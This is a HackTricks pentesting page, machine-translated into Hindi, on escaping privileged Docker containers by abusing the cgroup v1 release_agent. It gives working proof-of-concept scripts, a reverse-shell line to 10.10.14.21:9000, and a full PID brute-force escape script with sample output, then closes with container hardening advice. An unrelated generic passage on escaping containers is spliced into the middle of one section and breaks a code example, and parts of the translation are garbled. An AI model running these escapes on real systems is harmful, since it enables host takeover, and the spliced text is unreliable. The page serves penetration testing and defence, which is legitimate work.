<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)

- प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **अपने हैकिंग ट्रिक्स को [hacktricks रेपो](https://github.com/carlospolop/hacktricks) और [hacktricks-cloud रेपो](https://github.com/carlospolop/hacktricks-cloud) में पीआर जमा करके साझा करें।**

</details>


# `--privileged` फ़्लैग

{% code title="प्रारंभिक PoC" %}
```bash
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o;
echo $t/c >$d/release_agent;
echo "#!/bin/sh $1 >$t/o" >/c;
chmod +x /c;
sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
{% code title="दूसरा प्रमाण" %}
```bash
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/10.10.14.21/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
head /output
```
{% endcode %}

`--privileged` फ्लैग में बड़ी सुरक्षा समस्याओं को प्रस्तुत करता है, और इस उपयोग का उपयोग करने के लिए एक डॉकर कंटेनर शुरू करने की आवश्यकता होती है। इस फ्लैग का उपयोग करते समय, कंटेनरों को सभी उपकरणों तक पूर्ण पहुंच होती है और उन्हें seccomp, AppArmor और Linux capabilities की प्रतिबंधन से वंचित कर दिया जाता है।

वास्तव में, `--privileged` इस तरीके के माध्यम से एक डॉकर कंटेनर से बाहर निकलने के लिए आवश्यक से अधिक अनुमतियां प्रदान करता है। वास्तव में, "केवल" आवश्यकताएं हैं:

1. हमें कंटेनर के अंदर रूट के रूप में चल रहे होना चाहिए
2. कंटेनर को `SYS_ADMIN` Linux capability के साथ चलाया जाना चाहिए
3. कंटेनर को AppArmor प्रोफ़ाइल की कमी होनी चाहिए, या फिर `mount` syscall की अनुमति देनी चाहिए
4. cgroup v1 वर्चुअल फ़ाइलसिस्टम को कंटेनर के अंदर read-write माउंट किया जाना चाहिए

`SYS_ADMIN` capability एक कंटेनर को mount syscall को करने की अनुमति देती है (देखें [man 7 capabilities](https://linux.die.net/man/7/capabilities))। [डॉकर डिफ़ॉल्ट रूप से सीमित संख्या की capabilities के साथ कंटेनर शुरू करता है](https://docs.docker.com/engine/security/security/#linux-kernel-capabilities) और `SYS_ADMIN` capability को सक्षम नहीं करता है क्योंकि इसके सुरक्षा जोखिमों के कारण।

इसके अलावा, डॉकर [डिफ़ॉल्ट रूप से `docker-default` AppArmor पॉलिसी के साथ कंटेनर शुरू करता है](https://docs.docker.com/engine/security/apparmor/#understand-the-policies), जो [mount syscall का उपयोग करने से रोकता है](https://github.com/docker/docker-ce/blob/v18.09.8/components/engine/profiles/apparmor/template.go#L35) जबकि कंटेनर `SYS_ADMIN` के साथ चलाया जाता है।

यदि कंटेनर को निम्नलिखित फ्लैग के साथ चलाया जाता है, तो यह तकनीक के प्रति संक्रमित हो सकता है: `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN`

## प्रूफ ऑफ कॉन्सेप्ट को विचारशील बनाना

अब जब हमें इस तकनीक का उपयोग करने की आवश्यकताएं समझ में आ गई हैं और हमने प्रूफ ऑफ कॉन्सेप्ट धोखाधड़ी को संशोधित किया है, चलो इसे पंक्ति-पंक्ति में विवरण देते हैं ताकि हम देख सकें कि यह कैसे काम करता है।

इस धोखाधड़ी को ट्रिगर करने के लिए हमें एक cgroup चाहिए जहां हम `release_agent` फ़ाइल बना सकते हैं और सभी प्रक्रियाओं को मारकर `release_agent` को आह्वानित कर सकते हैं। इसे प्राप्त करने का सबसे आसान तरीका एक cgroup नियंत्रक माउंट करना है और एक बच्चा cgroup बनाना है।

इसके लिए, हम एक `/tmp/cgrp` निर्देशिका बनाते हैं, [RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup नियंत्रक माउंट करते हैं और एक बच्चा cgroup बनाते हैं (इस उदाहरण के लिए "x" नामित)। हालांकि हर cgroup नियंत्रक का परीक्षण नहीं किया गया है, इस तकनीक का उपयोग बहुमत cgroup नियंत्रकों के साथ काम करना चाहिए।

यदि आप इसका पालन कर रहे हैं और "mount: /tmp/cgrp: special device cgroup does not exist" मिलता है, तो इसका कारण है कि आपके सेटअप में RDMA cgroup नियंत्रक नहीं है। इसे ठीक करने के लिए `rdma` को `memory` में बदलें। हम RDMA का उपयोग कर रहे हैं क्योंकि मूल PoC केवल इसके साथ काम करने के लिए डिज़ाइन किया गया था।

ध्यान दें कि cgroup नियंत्रक वैश्विक संसाधन हैं जो विभिन्न अनुमतियों के साथ कई बार माउंट किए जा सकते हैं और एक माउंट में किए गए परिवर्तन दूसरे माउंट पर लागू होंगे।

हम नीचे "x" बच्चा cgroup के निर्माण और उसकी निर्देशिका सूची देख सकते हैं।
```text
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
अगले, हम "x" सीग्रुप के रिलीज़ होने पर `notify_on_release` फ़ाइल में 1 लिखकर cgroup अधिसूचनाएं सक्षम करते हैं। हम भी RDMA cgroup रिलीज़ एजेंट को सेट करते हैं ताकि यह `/cmd` स्क्रिप्ट को निष्पादित कर सके - जिसे हम बाद में कंटेनर में बनाएंगे - होस्ट पर `release_agent` फ़ाइल में होस्ट पर `/cmd` स्क्रिप्ट पथ लिखकर। इसके लिए, हम कंटेनर के पथ को `/etc/mtab` फ़ाइल से होस्ट पर प्राप्त करेंगे।

हम कंटेनर में जो फ़ाइलें जोड़ते हैं या संशोधित करते हैं, वे होस्ट पर मौजूद होती हैं, और इन्हें दोनों दुनियों से संशोधित किया जा सकता है: कंटेनर में पथ और होस्ट पर उनका पथ।

इन ऑपरेशन्स को नीचे देखा जा सकता है:
```text
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
नोट करें `/cmd` स्क्रिप्ट के पथ को, जिसे हम होस्ट पर बनाने जा रहे हैं:
```text
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
अब, हम `/cmd` स्क्रिप्ट बनाते हैं जिसके द्वारा यह `ps aux` कमांड को निष्पादित करेगा और इसका आउटपुट `/output` में संग्रहीत करेगा, होस्ट पर आउटपुट फ़ाइल के पूर्ण पथ को निर्दिष्ट करके। अंत में, हम भी `/cmd` स्क्रिप्ट को प्रिंट करते हैं ताकि हम इसकी सामग्री देख सकें:
```text
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
अंत में, हम एक प्रक्रिया उत्पन्न करके हमला को क्रियान्वित कर सकते हैं जो "x" बाल बच्चा समूह के अंदर तत्काल खत्म हो जाती है। "/bin/sh" प्रक्रिया बनाकर और इसका पीआईडी "x" बाल बच्चा समूह निर्देशिका में `cgroup.procs` फ़ाइल में लिखकर, मेजबान पर स्क्रिप्ट `/bin/sh` के बाद निष्पादित होगी। मेजबान पर किए गए `ps aux` के आउटपुट को फिर `/output` फ़ाइल में कंटेनर के अंदर सहेजा जाता है:
```text
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
# `--privileged` फ्लैग v2

पिछले PoCs काम करते हैं जब कंटेनर को संग्रह ड्राइवर के साथ कॉन्फ़िगर किया जाता है जो माउंट पॉइंट का पूरा होस्ट पथ उजागर करता है, उदाहरण के लिए `overlayfs`, हालांकि हाल ही में मुझे कुछ कॉन्फ़िगरेशन मिली जिनमें होस्ट फ़ाइल सिस्टम माउंट पॉइंट स्पष्ट रूप से उजागर नहीं होता था।

## काटा कंटेनर्स
```text
root@container:~$ head -1 /etc/mtab
kataShared on / type 9p (rw,dirsync,nodev,relatime,mmap,access=client,trans=virtio)
```
[Kata Containers](https://katacontainers.io/) डिफ़ॉल्ट रूप से `9pfs` के माध्यम से कंटेनर की रूट फ़ाइल सिस्टम को माउंट करता है। इससे कटा कंटेनर वर्चुअल मशीन में कंटेनर फ़ाइल सिस्टम के स्थान के बारे में कोई जानकारी प्रकट नहीं होती है।

\* कटा कंटेनर्स के बारे में अधिक जानकारी एक भविष्य के ब्लॉग पोस्ट में।

## डिवाइस मैपर
```text
root@container:~$ head -1 /etc/mtab
/dev/sdc / ext4 rw,relatime,stripe=384 0 0
```
मैंने एक लाइव पर्यावरण में इस रूट माउंट के साथ एक कंटेनर देखा, मुझे लगता है कि कंटेनर एक विशेष `devicemapper` स्टोरेज-ड्राइवर कॉन्फ़िगरेशन के साथ चल रहा था, लेकिन इस समय तक मुझे एक परीक्षण पर्यावरण में इस व्यवहार को पुनर्निर्माण करने में असमर्थता हुई है।

## एक वैकल्पिक PoC

स्पष्ट है कि इन मामलों में कंटेनर फ़ाइलों के पथ की पहचान करने के लिए पर्याप्त जानकारी नहीं होती है, इसलिए फेलिक्स के PoC का उपयोग नहीं किया जा सकता है। हालांकि, हम थोड़ी तर्कशक्ति के साथ इस हमले को अभी भी कार्यान्वित कर सकते हैं।

एकमात्र जरूरी जानकारी यह है कि कंटेनर में निर्मित करने के लिए, कंटेनर होस्ट के संबंध में एक फ़ाइल का पूरा पथ चाहिए। कंटेनर के भीतर माउंट पॉइंट्स से इसे पहचानने के बजाय, हमें अन्य स्थानों पर देखना होगा।

### Proc की मदद <a id="proc-to-the-rescue"></a>

लिनक्स `/proc` प्सेडो-फ़ाइलसिस्टम सभी प्रक्रियाओं के लिए कर्नल प्रक्रिया डेटा संरचनाएँ प्रदर्शित करता है, जो सिस्टम पर चल रही हैं, जिनमें से कुछ अलग नेमस्पेस में चल रही हैं, उदाहरण के लिए कंटेनर के भीतर। इसे कंटेनर में एक कमांड चलाकर और होस्ट पर प्रक्रिया के `/proc` निर्देशिका तक पहुँचकर दिखाया जा सकता है: कंटेनर
```bash
root@container:~$ sleep 100
```

```bash
root@host:~$ ps -eaf | grep sleep
root     28936 28909  0 10:11 pts/0    00:00:00 sleep 100
root@host:~$ ls -la /proc/`pidof sleep`
total 0
dr-xr-xr-x   9 root root 0 Nov 19 10:03 .
dr-xr-xr-x 430 root root 0 Nov  9 15:41 ..
dr-xr-xr-x   2 root root 0 Nov 19 10:04 attr
-rw-r--r--   1 root root 0 Nov 19 10:04 autogroup
-r--------   1 root root 0 Nov 19 10:04 auxv
-r--r--r--   1 root root 0 Nov 19 10:03 cgroup
--w-------   1 root root 0 Nov 19 10:04 clear_refs
-r--r--r--   1 root root 0 Nov 19 10:04 cmdline
...
-rw-r--r--   1 root root 0 Nov 19 10:29 projid_map
lrwxrwxrwx   1 root root 0 Nov 19 10:29 root -> /
-rw-r--r--   1 root root 0 Nov 19 10:29 sched
...
```
_एक बात कहूं, `/proc/<pid>/root` डेटा संरचना एक ऐसी थी जिसने मुझे बहुत समय तक भ्रमित किया, मैं कभी समझ नहीं सका कि `/` के लिए एक प्रतीकी लिंक होना कितना उपयोगी हो सकता है, जब तक मैं मैन पेज में वास्तविक परिभाषण को नहीं पढ़ा:_

> /proc/\[pid\]/root
>
> UNIX और Linux में प्रतिप्रोसेस फ़ाइलसिस्टम की एक प्रति-प्रक्रिया जड़ होने की समर्थन करते हैं, जिसे chroot\(2\) सिस्टम कॉल द्वारा सेट किया जाता है। यह फ़ाइल एक प्रतीकी लिंक है जो प्रक्रिया के रूट निर्देशिका को पॉइंट करता है, और exe और fd/\* की तरह व्यवहार करता है।
>
> हालांकि ध्यान दें कि यह फ़ाइल केवल एक प्रतीकी लिंक नहीं है। यह प्रक्रिया के रूप में वही फ़ाइलसिस्टम का दृश्य प्रदान करता है \(नेमस्पेस और प्रति-प्रक्रिया माउंट की सेट सहित\) जैसा कि प्रक्रिया खुद करती है।

`/proc/<pid>/root` प्रतीकी लिंक को कंटेनर में किसी भी फ़ाइल के लिए होस्ट संबंधित पथ के रूप में उपयोग किया जा सकता है: कंटेनर
```bash
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```

```bash
root@host:~$ cat /proc/`pidof sleep`/root/findme
findme
```
यह हमले के लिए आवश्यकता को बदल देता है, जहां कंटेनर में एक फ़ाइल के पूरे पथ को कंटेनर होस्ट के संबंध में जानने की आवश्यकता होती है, एक कंटेनर में चल रहे _किसी भी_ प्रक्रिया के pid को जानने की आवश्यकता होती है।

### Pid Bashing <a id="pid-bashing"></a>

यह वास्तव में आसान है, लिनक्स में प्रक्रिया आईडी संख्यात्मक होते हैं और यह अवरोही आईडी संख्याओं के साथ सौभाग्य से संबंधित होते हैं। `init` प्रक्रिया को प्रक्रिया आईडी `1` के रूप में सौंपा जाता है और सभी आगामी प्रक्रियाओं को आवरोही आईडी संख्याओं के रूप में सौंपा जाता है। कंटेनर में एक प्रक्रिया के होस्ट प्रक्रिया आईडी की पहचान करने के लिए, एक ब्रूट फ़ोर्स आवरोही खोज का उपयोग किया जा सकता है: कंटेनर
```text
root@container:~$ echo findme > /findme
root@container:~$ sleep 100
```
# डॉकर कंटेनर से बाहर निकलना

जब आप एक डॉकर कंटेनर में हैं और आपको उच्चतम अधिकार प्राप्त करने की आवश्यकता होती है, तो आप निम्नलिखित तकनीकों का उपयोग करके डॉकर कंटेनर से बाहर निकल सकते हैं:

## 1. डॉकर कंटेनर के अंदर रूट अधिकार प्राप्त करना

यदि आपको डॉकर कंटेनर के अंदर रूट अधिकार प्राप्त करने की आवश्यकता है, तो आप निम्नलिखित चरणों का पालन कर सकते हैं:

1. डॉकर कंटेनर को चलाएं: `docker run -it --privileged <image>`
2. अब आप डॉकर कंटेनर के अंदर होंगे। यहां आप `root` उपयोगकर्ता के रूप में लॉगिन कर सकते हैं।

## 2. डॉकर कंटेनर से बाहर निकलने के लिए डॉकर सॉकेट का उपयोग करना

यदि आपको डॉकर कंटेनर से बाहर निकलने की आवश्यकता है, तो आप निम्नलिखित चरणों का पालन कर सकते हैं:

1. डॉकर सॉकेट के साथ एक नया डॉकर कंटेनर चलाएं: `docker run -v /var/run/docker.sock:/var/run/docker.sock -it <image>`
2. अब आप डॉकर कंटेनर के अंदर होंगे और आपको डॉकर कंटेनर के बाहरी डॉकर डेमन के साथ संपर्क स्थापित करने की अनुमति मिलेगी।

इन तकनीकों का उपयोग करके आप डॉकर कंटेनर से बाहर निकल सकते हैं और उच्चतम अधिकार प्राप्त कर सकते हैं।
```bash
root@host:~$ COUNTER=1
root@host:~$ while [ ! -f /proc/${COUNTER}/root/findme ]; do COUNTER=$((${COUNTER} + 1)); done
root@host:~$ echo ${COUNTER}
7822
root@host:~$ cat /proc/${COUNTER}/root/findme
findme
```
### सब कुछ मिलाकर रखना <a id="putting-it-all-together"></a>

इस हमले को पूरा करने के लिए brute force तकनीक का उपयोग किया जा सकता है ताकि `/proc/<pid>/root/payload.sh` पथ के लिए pid को अनुमान लगाया जा सके, प्रत्येक अवधि में अनुमानित pid पथ को cgroups `release_agent` फ़ाइल में लिखा जाए, `release_agent` को ट्रिगर किया जाए, और देखें कि क्या एक आउटपुट फ़ाइल बनाई जाती है।

इस तकनीक के साथ एकमात्र सावधानी यह है कि यह किसी भी तरीके से छिपा हुआ नहीं है, और pid गिनती को बहुत ऊँचा कर सकता है। क्योंकि कोई लंबे समय तक चलने वाली प्रक्रियाएं चलाई नहीं जाती हैं, इसलिए यह संभावित रूप से सुरक्षितता समस्याओं का कारण नहीं बनेगा, लेकिन इस पर मेरे वचन पर विश्वास न करें।

नीचे दिए गए PoC में इन तकनीकों का अमल किया गया है ताकि cgroups `release_agent` की कार्यक्षमता का उपयोग करके एक विशेषज्ञता वाले कंटेनर से बाहर निकलने के लिए पहले Felix के मूल PoC से अधिक सामान्य हमला प्रदान किया जा सके:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
एक प्रिविलेज्ड कंटेनर के भीतर PoC को निष्पादित करने से आउटपुट इसके समान होना चाहिए:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
# सुरक्षित ढंग से कंटेनर का उपयोग करें

डॉकर डिफ़ॉल्ट रूप से कंटेनरों को प्रतिबंधित और सीमित करता है। इन प्रतिबंधनों को कम करना सुरक्षा समस्याओं को उत्पन्न कर सकता है, यहां तक कि `--privileged` फ़्लैग की पूरी शक्ति के बिना भी। प्रत्येक अतिरिक्त अनुमति के प्रभाव को स्वीकार करना महत्वपूर्ण है, और सामान्य रूप से अवश्यकता के न्यूनतम अनुमतियों को सीमित करें।

कंटेनरों को सुरक्षित रखने के लिए निम्नलिखित कार्रवाईयाँ करें:

* `--privileged` फ़्लैग का उपयोग न करें और कंटेनर के अंदर [डॉकर सॉकेट माउंट](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/) न करें। डॉकर सॉकेट कंटेनर को उत्पन्न करने की अनुमति देता है, इसलिए यह `--privileged` फ़्लैग के साथ एक और कंटेनर चलाने का आसान तरीका है।
* कंटेनर के अंदर रूट के रूप में न चलाएं। [एक अलग उपयोगकर्ता](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user) या [उपयोगकर्ता नेमस्पेस](https://docs.docker.com/engine/security/userns-remap/) का उपयोग करें। कंटेनर में रूट होस्ट के समान होता है जब तक उपयोगकर्ता नेमस्पेस के साथ पुनर्मापित नहीं किया जाता है। यह मुख्य रूप से लिनक्स नेमस्पेस, क्षमताएँ और सीग्रुप्स द्वारा हल्के से प्रतिबंधित होता है।
* [सभी क्षमताएँ छोड़ दें](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities) \(`--cap-drop=all`\) और केवल वे क्षमताएँ सक्षम करें जो आवश्यक हों \(`--cap-add=...`\). बहुत सारे कार्यदायी क्षमताएँ की आवश्यकता नहीं होती है और इन्हें जोड़ने से एक संभावित हमले के दायरे में वृद्धि होती है।
* [“no-new-privileges” सुरक्षा विकल्प का उपयोग करें](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/) ताकि प्रक्रियाएं अधिक विशेषाधिकार प्राप्त न करें, उदाहरण के लिए suid बाइनरी के माध्यम से।
* कंटेनर के लिए [संसाधनों की सीमा निर्धारित करें](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources)। संसाधन सीमाएं विवरण सेवा हमलों से मशीन की सुरक्षा कर सकती हैं।
* [सेकॉम्प](https://docs.docker.com/engine/security/seccomp/), [AppArmor](https://docs.docker.com/engine/security/apparmor/) \(या SELinux\) प्रोफ़ाइल को सीमित करें ताकि कंटेनर के लिए उपलब्ध क्रियाएँ और सिसकॉल्स की न्यूनतम आवश्यकता हो।
* [आधिकारिक डॉकर इमेजेज](https://docs.docker.com/docker-hub/official_images/) का उपयोग करें या उन पर आधारित अपनी इमेजेज बनाएं। [बैकडोर्ड](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/) इमेजेज का उत्पादन न करें और उनका उपयोग न करें।
* नियमित रूप से अपनी इमेजेज को नवीनतम सुरक्षा पैच लागू करने के लिए पुनः निर्माण करें। यह बात स्वतः स्पष्ट है।

# संदर्भ

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/_fel1x/status/1151487051986087936)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स** में विज्ञापित करना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण का उपयोग करना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!

- खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह।

- प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)

- **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** का** अनुसरण करें।

- **अपने हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स रेपो
